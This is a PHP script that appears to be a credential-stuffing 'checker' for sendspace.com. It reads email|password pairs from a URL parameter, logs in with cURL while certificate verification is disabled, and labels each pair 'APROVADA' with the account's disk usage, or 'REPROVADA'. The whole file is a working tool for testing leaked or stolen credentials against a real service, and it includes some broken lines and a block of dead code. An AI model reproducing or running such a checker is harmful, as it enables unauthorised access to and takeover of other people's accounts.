<?php
set_time_limit(0);
error_reporting(0);

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func('$callback', $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$a = new cURL();
        $b = $a->post('https://www.sendspace.com/login.html', 'action=login&username='.$email.'&password='.$senha.'&remember=on&submit=Log+In');
        
        $caa = new cURL();
        $daa = $caa->get('https://www.sendspace.com/mysendspace/myindex.html'); //POST DA 2 CHAMADA 

        $getscurl = new cURL();
        $getss = $getscurl->get('https://www.sendspace.com/mysendspace/myindex.html');

if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
               
        if (strpos($daa, 'Home')) { 

  $nome = GetStr($getss, '<li>Total Disk Space Used: ','</li>');

 echo "APROVADA → $email|$senha | Disco: $nome";
 
  

        }else{

        echo "REPROVADA → $email|$senha";
   

}
 
    


?>